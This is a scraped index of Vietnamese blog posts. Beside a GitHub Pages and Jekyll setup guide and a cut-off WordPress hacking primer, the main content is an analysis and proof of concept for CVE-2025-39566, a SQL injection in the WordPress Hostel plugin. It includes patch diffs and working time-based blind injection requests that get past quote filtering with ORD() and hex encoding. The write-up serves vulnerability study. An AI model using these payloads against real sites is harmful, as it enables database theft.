\u0026lt;username\u0026gt; th√†nh Github username c·ªßa b·∫°n. Setting up the Environment C√≥ 2 l√Ω do ch√≠nh b·∫°n n√™n setup m√¥i tr∆∞·ªùng tr√™n m√°y local khi ph√°t tri·ªÉn blog:\nSau khi push code l√™n Repository, GitHub Actions s·∫Ω m·∫•t m·ªôt kho·∫£ng th·ªùi gian ƒë·ªÉ ch·∫°y r·ªìi m·ªõi build v√† render ra GitHub Pages. Khi dev tr·ª±c ti·∫øp tr√™n local, b·∫°n c√≥ th·ªÉ quan s√°t k·∫øt qu·∫£ ngay l·∫≠p t·ª©c, nhanh h∆°n v√† thu·∫≠n ti·ªán h∆°n. Using Dev Containers (Recommended for Windows) Dev Containers cung c·∫•p m·ªôt m√¥i tr∆∞·ªùng c√¥ l·∫≠p b·∫±ng Docker, gi√∫p tr√°nh xung ƒë·ªôt v·ªõi h·ªá th·ªëng v√† ƒë·∫£m b·∫£o m·ªçi dependency ƒë·ªÅu ƒë∆∞·ª£c qu·∫£n l√Ω trong container.\nC√°c b∆∞·ªõc th·ª±c hi·ªán:\nC√†i ƒë·∫∑t Docker: Tr√™n Windows/macOS: c√†i Docker Desktop. Tr√™n Linux: c√†i Docker Engine. C√†i VS Code v√† extension Dev Containers. Clone repository: N·∫øu d√πng Docker Desktop: m·ªü VS Code v√† clone repo trong container volume. N·∫øu d√πng Docker Engine: clone repo v·ªÅ local, sau ƒë√≥ m·ªü b·∫±ng container trong VS Code. Ch·ªù qu√° tr√¨nh thi·∫øt l·∫≠p Dev Containers ho√†n t·∫•t. Setting up Natively (Recommended for Unix-like OS) V·ªõi c√°c h·ªá ƒëi·ªÅu h√†nh d·∫°ng Unix-like (Linux, macOS), b·∫°n c√≥ th·ªÉ setup m√¥i tr∆∞·ªùng tr·ª±c ti·∫øp (native) ƒë·ªÉ ƒë·∫°t hi·ªáu nƒÉng t·ªët nh·∫•t. Ngo√†i ra, v·∫´n c√≥ th·ªÉ d√πng Dev Containers nh∆∞ m·ªôt l·ª±a ch·ªçn thay th·∫ø.\nC√°c b∆∞·ªõc th·ª±c hi·ªán:\nL√†m theo h∆∞·ªõng d·∫´n c√†i ƒë·∫∑t Jekyll v√† ƒë·∫£m b·∫£o ƒë√£ c√†i ƒë·∫∑t Git. Clone repository v·ªÅ m√°y local. N·∫øu b·∫°n fork theme, c√†i Node.js v√† ch·∫°y bash tools/init.sh trong th∆∞ m·ª•c g·ªëc ƒë·ªÉ kh·ªüi t·∫°o repo. Ch·∫°y l·ªánh d∆∞·ªõi ƒë√¢y ·ªü th∆∞ m·ª•c g·ªëc ƒë·ªÉ to√†n b·ªô gem s·∫Ω ƒë∆∞·ª£c c√†i v√†o ./vendor/bundle/ trong project, kh√¥ng c·∫ßn sudo v√† kh√¥ng ƒë·ª•ng g√¨ ƒë·∫øn /var/lib/gems.. bundle config set --local path \u0026#39;vendor/bundle\u0026#39; bundle install Usage Start the Jekyll Server ƒê·ªÉ ch·∫°y site tr√™n local, s·ª≠ d·ª•ng l·ªánh d∆∞·ªõi ƒë√¢y:\nbundle exec jekyll s Configuration M·ªôt s·ªë bi·∫øn c·∫ßn c·∫•u h√¨nh trong _config.yml, bao g·ªìm:\nlang: Set language cho website c·ªßa b·∫°n url: Tr·ªè ƒë·∫øn website c·ªßa b·∫°n title: Title ch√≠nh, n·∫±m d∆∞·ªõi avatar tagline: Subtitle, m√¥ t·∫£ trang web avatar: h·ªó tr·ª£ local v√† CORS resources, c√≥ th·ªÉ s·ª≠ d·ª•ng gif Comment feature via Giscus Ta s·ª≠ d·ª•ng Giscus l√†m h·ªá th·ªëng comment cho website, ngo√†i ra c√≤n c√°c option kh√°c nh∆∞: Disqus, Utterances, t·∫•t c·∫£ ƒë·ªÅu mi·ªÖn ph√≠.\nC√°c b∆∞·ªõc th·ª±c hi·ªán:\nC√†i ƒë·∫∑t giscus v√†o Github. V√†o Settings c·ªßa repository ch·ªçn General v√† b·∫≠t Discussions ƒë·ªÉ giscus l∆∞u comments v√†o Discussions. Nh·∫≠p repository \u0026lt;username\u0026gt;/\u0026lt;username\u0026gt;.github.io, th√¥ng b√°o m√†u xanh l√° xu·∫•t hi·ªán khi c√°c ti√™u ch√≠ ·ªü tr√™n ƒë∆∞·ª£c ƒë√°p ·ª©ng. Ch·ªçn th·ªÉ lo·∫°i discussion v√† ch·ªß ƒë·ªÅ cho website. C·∫•u h√¨nh giscus trong _config.yml provider: ch·ªçn giscus giscus: mapping c√°c bi·∫øn t∆∞∆°ng ·ª©ng ƒë√£ l√†m ·ªü giscus v√†o bi·∫øn giscus. Customize the Favicon T·∫°o favicon ri√™ng cho website c·ªßa b·∫°n, kh√¥ng ph·∫£i s·ª≠ d·ª•ng favicon m·∫∑c ƒë·ªãnh c·ªßa themes\nC√°c b∆∞·ªõc th·ª±c hi·ªán:\nTruy c·∫≠p Favicon Genarate Click Browse ch·ªçn favicon c·∫ßn t·∫°o, sau ƒë√≥ click Create Favicon ƒë·ªÉ t·∫°o. Click Download the generated favicon ƒë·ªÉ t·∫£i c√°c file ch·ª©a c√°c favicon v·ªÅ. Gi·∫£i n√©n file v·ª´a t·∫£i, x√≥a 2 file d∆∞·ªõi ƒë√¢y: browserconfig.xml site.webmanifest Copy to√†n b·ªô file c√≤n l·∫°i v√† paste v√†o assets/img/favicons(n·∫øu ch∆∞a c√≥ th√¨ t·∫°o). Extends Remove meta tag in Footer C√≥ th·ªÉ x√≥a d√≤ng Using the Chirpy theme for Jekyll. b·∫±ng c√°c b∆∞·ªõc sau:\nT·∫°o file theo ƒë∆∞·ªùng d·∫´n sau _data/locales/en.yml. Copy n·ªôi dung en.yml v√† d√°n v√†o file v·ª´a t·∫°o. S·ª≠a n·ªôi dung bi·∫øn meta th√†nh \u0026quot;\u0026quot; Write a post Tham kh·∫£o rule ƒë·ªÉ vi·∫øt blog c·ªßa themes v√† s·ª≠ d·ª•ng Live Preview ƒë·ªÉ quan s√°t\n","permalink":"//localhost:1313/vi/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eKhi b·∫Øt ƒë·∫ßu t·∫°o blog c√° nh√¢n, c√≥ ba c√¥ng c·ª• b·∫°n c·∫ßn bi·∫øt: GitHub Pages, Jekyll v√† Giscus.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eGithub Pages\u003c/strong\u003e: D·ªãch v·ª• mi·ªÖn ph√≠ t·ª´ GitHub, cho ph√©p b·∫°n tri·ªÉn khai website tƒ©nh tr·ª±c ti·∫øp t·ª´ repository. Ch·ªâ c·∫ßn push code l√™n GitHub, blog c·ªßa b·∫°n s·∫Ω t·ª± ƒë·ªông xu·∫•t hi·ªán tr√™n Internet m√† kh√¥ng c·∫ßn server ri√™ng.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eJekyll\u003c/strong\u003e: M·ªôt static site generator t√≠ch h·ª£p s·∫µn v·ªõi GitHub Pages. Jekyll gi√∫p b·∫°n d·ªÖ d√†ng t·∫°o blog t·ª´ c√°c file Markdown, t·ªï ch·ª©c n·ªôi dung b·∫±ng template v√† theme s·∫µn c√≥.\u003c/p\u003e","title":"Github Pages with Jekyll themes and Giscus"},{"content":"L·ªó h·ªïng trong plugin Hostel tr∆∞·ªõc phi√™n b·∫£n 1.1.5.7. Do vi·ªác l√†m s·∫°ch d·ªØ li·ªáu kh√¥ng ƒë√∫ng c√°ch, ƒëi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\nCVE ID: CVE-2025-39566 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.1.5.6 CVSS severity: 7.6 (High) Required Privilege: Administrator Requirements Local WordPress and Debugging Hostel Plugin: v1.1.5.6(vul) v√† v1.1.5.7(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis Nguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ GET request v√†o SQL query m√† c∆° ch·∫ø ki·ªÉm so√°t kh√¥ng ch·∫∑t ch·∫Ω.\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file controllers/bookings.php\nB·∫£n l·ªó h·ªïng:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } B·∫£n v√°:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) { $ob = sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]); if(!in_array($ob, [\u0026#39;tB.id\u0026#39;, \u0026#39;tB.contact_name\u0026#39;, \u0026#39;tB.contact_email\u0026#39;, \u0026#39;tB.from_date\u0026#39;, \u0026#39;tB.amount_paid\u0026#39;, \u0026#39;tB.status\u0026#39;])) { $ob = \u0026#39;tB.id\u0026#39;; } $orderby = \u0026#34;ORDER BY $ob $dir\u0026#34;; } üëâ B·∫£n v√° s·ª≠ d·ª•ng whitelist ƒë·ªÉ gi·ªõi h·∫°n c√°c c·ªôt c√≥ th·ªÉ ƒë∆∞·ª£c s·∫Øp x·∫øp, n·∫øu kh√¥ng h·ª£p l·ªá tr·∫£ v·ªÅ 'tB.id'.\nAnalysis: L·ªó h·ªïng xu·∫•t hi·ªán khi param ob ƒë∆∞·ª£c truy·ªÅn tr·ª±c ti·∫øp v√†o m·ªánh ƒë·ªÅ ORDER BY th√¥ng qua h√†m sanitize_text_field(), ch·ªâ escape m√† kh√¥ng filter SQLi.\nHow it work? ƒê·ªÉ inject ƒë∆∞·ª£c, ta c·∫ßn ph·∫£i x√°c ƒë·ªãnh to√†n b·ªô c√¢u query ƒë∆∞·ª£c ƒë∆∞·ª£c s·ª≠ d·ª•ng ·ªü ƒë√¢y\n$bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); C√¢u query n·∫±m trong nh√°nh default c·ªßa c·∫•u tr√∫c switch.\nTo√†n b·ªô ƒëo·∫°n x·ª≠ l√Ω na·ª≥ thu·ªôc v·ªÅ h√†m static manage() c·ªßa class WPHostelBookings.\nclass WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET[\u0026#39;do\u0026#39;]) { case \u0026#39;add\u0026#39;: // add handle break; case \u0026#39;edit\u0026#39;: // edit handle break; // view/print booking details. Will allow also to confirm/cancel case \u0026#39;view\u0026#39;: // view handle\tbreak;\t// list bookings default: // another logic if(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } $bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); // another logic break; } } } Trong WordPress, plugin giao ti·∫øp v·ªõi core th√¥ng qua Plugin API (Hook System). Do ƒë√≥, ƒë·ªÉ x√°c ƒë·ªãnh n∆°i h√†m manage() ƒë∆∞·ª£c g·ªçi, ta c√≥ th·ªÉ t√¨m ki·∫øm t·ª´ kh√≥a \u0026quot;manage\u0026quot; trong th∆∞ m·ª•c ch·ª©a plugin.\nTrong file models/hostel.php ta c√≥ h√†m:\nclass class WPHostel { // another logic static function menu() { // we use \u0026#39;hostelpro_manage\u0026#39; for consistency with the pro version $wphostel_caps = current_user_can(\u0026#39;manage_options\u0026#39;) ? \u0026#39;manage_options\u0026#39; : \u0026#39;hostelpro_manage\u0026#39;; add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_rooms\u0026#39;, array(\u0026#39;WPHostelRooms\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_unavailable\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;unavailable\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_emaillog\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;email_log\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_help\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;index\u0026#34;)); } // another logic } ·ªû ƒë√¢y:\nadd_menu_page() t·∫°o menu ch√≠nh trong Admin Dashboard. add_submenu_page() th√™m c√°c submenu con cho menu ƒë√≥. Tham s·ªë $callback l√† m·ªôt callback function s·∫Ω ƒë∆∞·ª£c g·ªçi khi ng∆∞·ªùi d√πng click v√†o menu/submenu. V√≠ d·ª•:\n// add_menu_page($page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;, $icon_url = \u0026#39;\u0026#39;, $position = null); add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); // add_submenu_page($parent_slug, $page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); // array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); =\u0026gt; WPHostelBookings::manage() T·∫•t c·∫£ menu/submenu n√†y ƒë·ªÅu ƒë∆∞·ª£c ƒëƒÉng k√Ω b√™n trong h√†m static menu() c·ªßa class WPHostel. Do ƒë√≥, ƒë·ªÉ x√°c ƒë·ªãnh n∆°i h√†m menu() ƒë∆∞·ª£c g·ªçi, ta c√≥ th·ªÉ t√¨m ki·∫øm t·ª´ kh√≥a menu trong th∆∞ m·ª•c ch·ª©a plugin.\nTrong file hostel.php ·ªü th∆∞ m·ª•c g·ªëc c·ªßa plugin ta c√≥:\nadd_action(\u0026#39;admin_menu\u0026#39;, array(\u0026#34;WPHostel\u0026#34;, \u0026#34;menu\u0026#34;)); // =\u0026gt; callback: WPHostel::menu() add_action() l√† m·ªôt Plugin API c·ªßa WordPress, cho ph√©p g·∫Øn m·ªôt callback v√†o m·ªôt action hook. Hook name ·ªü ƒë√¢y l√† admin_menu, nghƒ©a l√† h√†m WPHostel::menu() s·∫Ω ƒë∆∞·ª£c g·ªçi trong v√≤ng ƒë·ªùi khi WordPress d·ª±ng Admin Dashboard Menu. Menu tr√™n UI Admin Dashboard\nDebugging\nCh·ª©c nƒÉng b·ªã l·ªói n·∫±m trong Booking Manager, v√¨ v·∫≠y ta truy c·∫≠p v√†o submenu Manager Bookings tr√™n UI Admin Dashboard. Ngay tr∆∞·ªõc nh√°nh default c√≥ comment // list bookings =\u0026gt; cho th·∫•y ƒëo·∫°n code n√†y x·ª≠ l√Ω vi·ªác li·ªát k√™ v√† s·∫Øp x·∫øp bookings M·ªü debugger: Click Run with Debugger. ƒê·∫∑t breakpoint t·∫°i nh√°nh switch ch·ª©a code l·ªói v√† t·∫°i d√≤ng code g√¢y l·ªói. Khi click v√†o m·ªôt c·ªôt trong b·∫£ng bookings, quan s√°t: Debugger nh·∫£y v√†o c·∫•u tr√∫c switch. D√πng Step Over, debugger ƒëi ti·∫øp v√†o nh√°nh default. Ti·∫øp t·ª•c Step Over v√† theo d√µi gi√° tr·ªã bi·∫øn trong tab Variables \u0026gt; Locals. C√°c bi·∫øn n√†y s·∫Ω k·∫øt h·ª£p ƒë·ªÉ t·∫°o th√†nh c√¢u SQL b√™n d∆∞·ªõi. Sau khi gh√©p c√°c bi·∫øn, c√¢u query ƒë·∫ßy ƒë·ªß c√≥ d·∫°ng:\nSELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM wp_hostel_bookings tB JOIN wp_hostel_rooms tR ON tR.id = tB.room_id WHERE is_static=0 AND tB.id = ... ORDER BY tB.amount_paid ASC|DESC LIMIT ... ƒê√°ng ch√∫ √Ω, bi·∫øn $orderby ƒë∆∞·ª£c g√°n nh∆∞ sau:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } ‚ö†Ô∏è ·ªû ƒë√¢y c√≥ ƒëi·ªÉm b·∫•t th∆∞·ªùng:\nPh·∫ßn sau ORDER BY s·ª≠ d·ª•ng sanitize_text_field(). H√†m n√†y ch·ªâ l√†m s·∫°ch HTML, kh√¥ng h·ªÅ filter ho·∫∑c validate ƒë·ªÉ ƒë·∫£m b·∫£o an to√†n trong SQL context. Tham s·ªë ob (do ng∆∞·ªùi d√πng truy·ªÅn v√†o) v√¨ v·∫≠y c√≥ th·ªÉ b·ªã l·ª£i d·ª•ng ƒë·ªÉ ch√®n tr·ª±c ti·∫øp v√†o c√¢u SQL. Exploit Detect SQLi Request with BurpSuite:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=upcoming\u0026amp;ob=tB.status,(SELECT+SLEEP(10))\u0026amp;dir=ASC HTTP/1.1 Ta t√°ch m·ªánh ƒë·ªÅ ORDER BY b·∫±ng , v√¨ n√≥ ch·∫•p nh·∫≠p multi column\nK·∫øt qu·∫£: th·ªùi gian ph·∫£n h·ªìi b·ªã delay =\u0026gt; SQL Injection th√†nh c√¥ng.\nDump Data from Database Bypass ' using ORD():\nƒê·ªÉ dump d·ªØ li·ªáu c·ªßa database ta c·∫ßn th·ª≠ ƒë·ªÉ l·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa database name.\nDo sanitize_text_field() lo·∫°i b·ªè ', ta kh√¥ng d√πng ƒë∆∞·ª£c payload so s√°nh tr·ª±c ti·∫øp. Thay v√†o ƒë√≥ d√πng ORD() ƒë·ªÉ so s√°nh k√Ω t·ª± theo ASCII:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(ORD(SUBSTRING(DATABASE(),1,1))=119,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Th√†nh c√¥ng bypass =\u0026gt; c√≥ th·ªÉ tr√≠ch xu·∫•t t√™n database.\nBypass ' using Hex encoding (extend)\nNgo√†i ORD() ta c√≥ th·ªÉ s·ª≠ d·ª•ng Hex encoding ƒë·ªÉ bypass\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Th√†nh c√¥ng bypass =\u0026gt; c√≥ th·ªÉ tr√≠ch xu·∫•t t√™n database.\nConclusion L·ªó h·ªïng CVE-2025-39566 trong plugin WordPress Hostel tr∆∞·ªõc phi√™n b·∫£n 1.1.5.7, xu·∫•t ph√°t t·ª´ vi·ªác truy·ªÅn tr·ª±c ti·∫øp input t·ª´ ng∆∞·ªùi d√πng v√†o SQL query m√† kh√¥ng c√≥ bi·ªán ph√°p ki·ªÉm so√°t ch·∫∑t ch·∫Ω d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nKey takeaways:\nsanitize_text_field() ‚â† ch·ªëng SQL Injection C·∫ßn ph√¢n bi·ªát r√µ: l·ªçc input cho HTML vs cho SQL References SQL Injection Cheat Sheet ‚Äì PortSwigger\nWordPress Hostel Plugin \u0026lt;= 1.1.5.6 is vulnerable to SQL Injection - patchstack\n","permalink":"//localhost:1313/vi/posts/2025-09-21-cve-2025-39566/","summary":"\u003cp\u003eL·ªó h·ªïng trong plugin \u003cstrong\u003eHostel\u003c/strong\u003e tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e1.1.5.7\u003c/strong\u003e. Do vi·ªác l√†m s·∫°ch d·ªØ li·ªáu kh√¥ng ƒë√∫ng c√°ch, ƒëi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39566\"\u003eCVE-2025-39566\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/hostel/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.1.5.6\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: 7.6 (High)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Administrator\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/blog/posts/2025-09-20-wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e:  v1.1.5.6(vul) v√† v1.1.5.7(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eNguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ \u003cstrong\u003eGET\u003c/strong\u003e request v√†o SQL query m√† c∆° ch·∫ø ki·ªÉm so√°t kh√¥ng ch·∫∑t ch·∫Ω.\u003c/p\u003e","title":"CVE-2025-39566 Analysis \u0026 POC"},{"content":"WordPress l√† m·ªôt h·ªá th·ªëng qu·∫£n l√Ω n·ªôi dung (CMS) m·∫°nh m·∫Ω v√† ph·ªï bi·∫øn nh·∫•t cho ph√©p b·∫°n t·∫°o, qu·∫£n l√Ω v√† t√πy ch·ªânh c√°c trang web v√† blog m·ªôt c√°ch d·ªÖ d√†ng. N√≥ l√† open-source CMS, ƒë∆∞·ª£c x√¢y d·ª±ng tr√™n PHP v√† s·ª≠ d·ª•ng c∆° s·ªü d·ªØ li·ªáu MySQL ho·∫∑c Maria DB.\nRa ƒë·ªùi nƒÉm 2003, ban ƒë·∫ßu ch·ªâ ƒë·ªÉ vi·∫øt blog, sau ƒë√≥ ph√°t tri·ªÉn th√†nh n·ªÅn t·∫£ng t·∫°o website, c·ª≠a h√†ng online, di·ªÖn ƒë√†n, landing page‚Ä¶ Hi·ªán nay, h∆°n 40% website tr√™n th·∫ø gi·ªõi ch·∫°y b·∫±ng WordPress. C√≥ 2 phi√™n b·∫£n WordPress:\nWordPress.com D·ªãch v·ª• hosting do Automattic cung c·∫•p B·∫°n ch·ªâ c·∫ßn ƒëƒÉng k√Ω t√†i kho·∫£n, kh√¥ng ph·∫£i c√†i ƒë·∫∑t H·∫°n ch·∫ø t√πy ch·ªânh, mu·ªën n√¢ng cao th√¨ ph·∫£i tr·∫£ ph√≠ WordPress.org M√£ ngu·ªìn m·ªü, b·∫°n t·ª± t·∫£i v·ªÅ v√† c√†i ƒë·∫∑t l√™n hosting/server ri√™ng T√πy ch·ªânh to√†n di·ªán, c√≥ th·ªÉ c√†i plugin, theme, vi·∫øt code, t·∫°o website theo √Ω m√¨nh Ecosystem Core: CMS ch√≠nh Plugin: M·ªôt ph·∫ßn m·ªÅm b·ªï sung c√≥ th·ªÉ ƒë∆∞·ª£c c√†i ƒë·∫∑t tr√™n trang web WordPress ƒë·ªÉ m·ªü r·ªông ch·ª©c nƒÉng c·ªßa n√≥ v√† th√™m c√°c t√≠nh nƒÉng m·ªõi Themes: M·ªôt ph·∫ßn m·ªÅm b·ªï sung ƒë·∫°i di·ªán cho s·ª± xu·∫•t hi·ªán tr·ª±c quan v√† b·ªë c·ª•c c·ªßa m·ªôt trang web WordPress Why WordPress Hacking? State of WordPress Security in 2024\nMost Popular Hi·ªán t·∫°i h∆°n 40% website tr√™n to√†n th·∫ø gi·ªõi ch·∫°y WordPress Nghƒ©a l√† hacker ch·ªâ c·∫ßn t√¨m ra m·ªôt l·ªó h·ªïng ph·ªï bi·∫øn =\u0026gt; c√≥ th·ªÉ khai th√°c h√†ng tri·ªáu site c√πng l√∫c Gi·ªëng nh∆∞ ‚Äúc√° nhi·ªÅu th√¨ ch√†i ·ªü ƒë√≥‚Äù Plugin and Theme WordPress Core ƒë√£ ƒë∆∞·ª£c xem x√©t trong 1 th·ªùi gian d√†i b·ªüi h√†ng ng√†n developers v√† researchers. K·∫øt qu·∫£ l√† r·∫•t kh√≥ ƒë·ªÉ k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ƒë·ªôt nh·∫≠p v√†o Tuy nhi√™n, c√≥ h√†ng ch·ª•c ng√†n plugin v√† theme t·ª´ nhi·ªÅu ngu·ªìn, ch·∫•t l∆∞·ª£ng kh√¥ng ƒë·ªìng ƒë·ªÅu ƒë∆∞·ª£c s·ª≠ d·ª•ng Nhi·ªÅu plugin code b·∫£o m·∫≠t k√©m, kh√¥ng c√≤n ƒë∆∞·ª£c c·∫≠p nh·∫≠t. Hacker ch·ªâ c·∫ßn scan plugin/theme ƒë·ªÉ t√¨m version l·ªói th·ªùi, r·ªìi khai th√°c Setup WordPress for Hacking C√≥ r·∫•t nhi·ªÅu c√°ch ƒë·ªÉ setup WorkPress, t√¨m ki·∫øm b·∫±ng Google c√≥ th·ªÉ cung c·∫•p nhi·ªÅu b√†i vi·∫øt v·ªÅ n√≥. ·ªû ƒë√¢y t√¥i 